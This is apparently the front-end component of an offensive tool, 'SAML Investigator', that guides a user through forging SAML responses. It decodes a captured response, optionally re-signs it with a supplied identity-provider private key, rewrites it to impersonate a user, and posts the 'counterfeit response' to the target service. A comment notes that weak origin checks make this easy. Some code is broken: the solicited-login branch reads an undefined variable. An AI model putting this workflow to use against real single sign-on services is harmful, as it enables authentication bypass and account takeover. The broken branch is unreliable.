<template>
  <!-- <div class="display-flex align-center justify-center h-100"> -->
  <v-container>
    <v-row>
      <v-col class="ma-10">
        <div class="text-h2 text-center">SAML Investigator 🔍</div>
      </v-col>
    </v-row>
    <v-row>
      <v-col cols="12" md="12">
        <v-stepper-vertical color="primary" @update:model-value="rerenderNextTick">
          <template v-slot:default="{ step }">
            <v-stepper-vertical-item :complete="step > 1" title="Inspect SAML Payload" value="1">
              <v-textarea label="Paste payload" v-model="payload" :hint="decodedMethods"
                :persistent-hint="decodedMethods.length > 0"></v-textarea>
              <pre style="max-height: 50em;">
                <code data-prismjs-copy="Copy" class="language-xml">{{ decoded }}</code>
              </pre>
              <v-alert text="We can use this to continue our counterfeit response generation."
                title="This looks like a valid SAML Response." type="success" variant="outlined"
                v-if="payloadIsValidResponse"></v-alert>
              <v-alert
                text="This may be a SAML Request or other XML, but we cannot use this for counterfeit response generation."
                title="This is not a valid SAML Response." type="info" variant="outlined"
                v-if="payload.length > 0 && !payloadIsValidResponse"></v-alert>
              <template v-slot:next="{ next }">
                <v-btn color="primary" @click="next" :disabled="payload.length == 0 || !payloadIsValidResponse"></v-btn>
              </template>
            </v-stepper-vertical-item>
            <v-stepper-vertical-item :complete="step > 2" subtitle="Optional" title="Enter Private Key" value="2">
              <v-textarea label="Identity Provider (Issuer) Private Key" v-model="privKey"
                hint="Leave blank to create a non-signed payload" persistent-hint></v-textarea>
              <v-alert text="We can use this to sign our counterfeit response."
                title="Successfully imported private key." type="success" variant="outlined"
                v-if="privKey.length > 0 && privKeyIsValid"></v-alert>
              <v-alert
                text="Please confirm it is an RSA key, PKCS8 encoded, for signing. For example, generated with openssl genrsa -out keypair.pem 2048."
                title="This is not a valid private key." type="info" variant="outlined"
                v-if="privKey.length > 0 && !privKeyIsValid"></v-alert>
              <template v-slot:next="{ next }">
                <v-btn color="primary" @click="next" :disabled="privKey.length > 0 && !privKeyIsValid"></v-btn>
              </template>
            </v-stepper-vertical-item>
            <v-stepper-vertical-item :complete="step > 3" subtitle="Optional" title="Solicit New Login" value="3">
              <p>Some Services support IdP-Initiated SSO, which means they do not need a previously solicited request.
                If you're not sure, leave this enabled for your first try.</p>
              <v-checkbox label="Use IdP-Initiated SSO" v-model="idpInitiated"></v-checkbox>
              <p :class="idpInitiated ? ['text-disabled', 'strikethrough'] : []">Head to {{ audience }}, start to login,
                but do not
                complete the authentication process. Stop before
                the Identity
                Provider (Issuer) responds.</p>
              <br />
              <p :class="idpInitiated ? ['text-disabled', 'strikethrough'] : []">Copy the <code>SAMLRequest</code> out
                of the
                request body.</p>
              <br />
              <v-textarea label="Paste SAMLRequest" v-model="solicitedSamlRequest"
                :disabled="idpInitiated"></v-textarea>
              <template v-slot:next="{ next }">
                <v-btn color="primary" @click="next"
                  :disabled="!idpInitiated && solicitedSamlRequest.length == 0"></v-btn>
              </template>
            </v-stepper-vertical-item>
            <v-stepper-vertical-item :complete="step > 4" title="Prepare and Edit New Payload" value="4">
              <v-btn class="mb-5 ml-5" color="primary" prepend-icon="mdi-printer-check"
                @click="preparePayloadInstantly">{{
                  preparedResponse.length > 0 ? "Reset Payload" : "Print New Payload" }}
                Instantly</v-btn>
              <v-dialog max-width="500">
                <template v-slot:activator="{ props: activatorProps }">

                  <v-btn v-bind="activatorProps" class="mb-5 ml-5" color="success" prepend-icon="mdi-auto-fix">{{
                    preparedResponse.length > 0 ? "Reset Payload" : "Print New Payload" }} With Explanation</v-btn>
                </template>

                <template v-slot:default="{ isActive }">
                  <v-card title="Print New Payload">
                    <v-card-text>
                      <prepare-response-animator />
                    </v-card-text>

                    <v-card-actions>
                      <v-spacer></v-spacer>

                      <v-btn text="Close" @click="isActive.value = false"></v-btn>
                    </v-card-actions>
                  </v-card>
                </template>
              </v-dialog>
              <v-textarea v-model="preparedResponse" hint="Modify however you like"
                :persistent-hint="preparedResponse.length > 0" :disabled="preparedResponse.length == 0" class="mb-5"
                style="min-height: 30em"></v-textarea>
              <v-alert text="We can use this to continue our counterfeit response generation."
                title="This looks like a valid SAML Response." type="success" variant="outlined"
                v-if="preparedResponseIsValid"></v-alert>
              <v-alert text="Check your XML syntax before proceeding." title="This is not a valid SAML Response."
                type="error" variant="outlined"
                v-if="preparedResponse.length > 0 && !preparedResponseIsValid"></v-alert>
              <template v-slot:next="{ next }">
                <v-btn color="primary" @click="next"
                  :disabled="preparedResponse.length == 0 || !preparedResponseIsValid"></v-btn>
              </template>
            </v-stepper-vertical-item>
            <v-stepper-vertical-item :complete="step > 5" title="Submit" value="5">
              <!-- You might think sites would implement some form of cross-origin protection,
                but many implementations just disable origin checking
                (a mitigation could be to limit to just the issuer origin).-->
                <v-container>
                  <v-row>
                    <v-col cols="12" md="6">
                      <form method="post" target="blank" :action="destination">
                        <input type="hidden" name="SAMLResponse" :value="preparedResponseEncoded" />
                        <!-- <input type="hidden" name="RelayState" value="test" /> -->
                        <v-btn color="secondary" type="submit" block prepend-icon="mdi-send">Submit Conterfeit Response (New Tab)</v-btn>
                      </form>
                    </v-col>
                    <v-col cols="12" md="6">
                      <form method="post" :action="destination">
                        <input type="hidden" name="SAMLResponse" :value="preparedResponseEncoded" />
                        <!-- <input type="hidden" name="RelayState" value="test" /> -->
                        <v-btn color="secondary" type="submit" block prepend-icon="mdi-file-send">Submit Conterfeit Response (This Tab)</v-btn>
                      </form>
                    </v-col>
                  </v-row>
                </v-container>
              <template v-slot:next>
              </template>
            </v-stepper-vertical-item>
          </template>
        </v-stepper-vertical>
      </v-col>
    </v-row>
  </v-container>
</template>

<script setup>
import Prism from "prismjs";

import "prismjs/themes/prism-twilight.css";
import "prismjs/plugins/toolbar/prism-toolbar.min";
import "prismjs/plugins/toolbar/prism-toolbar.min.css";
import "prismjs/plugins/copy-to-clipboard/prism-copy-to-clipboard";
import "prismjs/plugins/normalize-whitespace/prism-normalize-whitespace.min";

import Decoder from '@/utils/decoder';
import SamlResponse, { isPrivateKeyValid } from "@/utils/samlResponse";
import encode from "@/utils/encoder";

const payload = ref("");
const privKey = ref("");
const decoded = ref("Decoded payload will appear here...");
const decodedMethods = ref("");
const impersonated = ref("");
const showPrivateKeyRow = shallowRef(false);
const payloadIsValidResponse = shallowRef(false);
const idpInitiated = shallowRef(true)
const preparedResponse = ref("")

const audience = computed(() => {
  var parser = new DOMParser();
  var xmlDoc = parser.parseFromString(decoded.value, "text/xml");
  var response = new SamlResponse(xmlDoc);
  return response.getAudience();
})

const issuer = computed(() => {
  var parser = new DOMParser();
  var xmlDoc = parser.parseFromString(decoded.value, "text/xml");
  var response = new SamlResponse(xmlDoc);
  return response.getIssuer();
})

const destination = computed(() => {
  var parser = new DOMParser();
  var xmlDoc = parser.parseFromString(decoded.value, "text/xml");
  var response = new SamlResponse(xmlDoc);
  return response.getDestination();
})

const solicitedSamlRequest = ref("")

const preparedResponseIsValid = computed(() => {
  const decoder = new Decoder(preparedResponse.value)
  return decoder.isSamlResponse()
})

const privKeyIsValid = shallowRef(false)

watch(privKey, async() => {
  privKeyIsValid.value = await isPrivateKeyValid(privKey.value)
})


const preparedResponseEncoded = ref("")

watch(preparedResponse, async () => {
  if (privKey.value.length > 0) {
    var parser = new DOMParser()
    var xmlDoc = parser.parseFromString(preparedResponse.value, "text/xml")
    var response = new SamlResponse(xmlDoc)
    const result = await response.resign2(privKey.value)
    preparedResponseEncoded.value = encode(result.toString())
  } else {
    preparedResponseEncoded.value = encode(preparedResponse.value)
  }
})

watch(payload, () => {
  parsePayload()
})

const parsePayload = () => {
  if (payload.value.length > 0) {
    var decoder = new Decoder(payload.value).uriDecode().base64Decode().inflate().utf8Parse().format();

    if (decoder.isValidXml()) {
      decoded.value = decoder.toString()
      decodedMethods.value = "Decoding methods: " + Array.from(decoder.decodedMethods).reverse().join(", ")
      payloadIsValidResponse.value = decoder.isSamlResponse()
    } else {
      decoded.value = "Could not decode: " + decoder.getXmlError()
      decodedMethods.value = ""
      payloadIsValidResponse.value = false
    }
    rerenderNextTick()
  } else {
    decoded.value = "Decoded payload will appear here..."
    payloadIsValidResponse.value = false
  }
};


const preparePayloadInstantly = () => {
  var parser = new DOMParser();
  var xmlDoc = parser.parseFromString(decoded.value, "text/xml");
  var response = new SamlResponse(xmlDoc);

  if (!idpInitiated) {
    var samlRequestDecoded = new Decoder(samlRequest.value).uriDecode().base64Decode().inflate().utf8Parse();
    var xmlDoc = parser.parseFromString(samlRequestDecoded.toString(), "text/xml");
    var newId = xmlDoc.getElementsByTagName("samlp:AuthnRequest")[0].getAttribute("ID")
    preparedResponse.value = response.convertToImpersonated(newId).toStringWithTagSerializationFix()
  } else {
    preparedResponse.value = response.convertToImpersonated().toStringWithTagSerializationFix()
  }

}

const rerenderNextTick = () => {
  nextTick(() => Prism.highlightAll())
}

onMounted(() => {
  // window.Prism = window.Prism || {};
  // window.Prism.manual = true;

  Prism.plugins.NormalizeWhitespace.setDefaults({
    "remove-trailing": true,
    "remove-indent": true,
    "left-trim": true,
    "right-trim": true,
    "remove-initial-line-feed": true,
    /*"break-lines": 80,
    "indent": 2,
    "tabs-to-spaces": 4,
    "spaces-to-tabs": 4*/
  });
  rerenderNextTick()

  window.Buffer = {
    isBuffer: () => false
  }
})

</script>


<style>
.strikethrough {
  text-decoration: line-through;
}
</style>
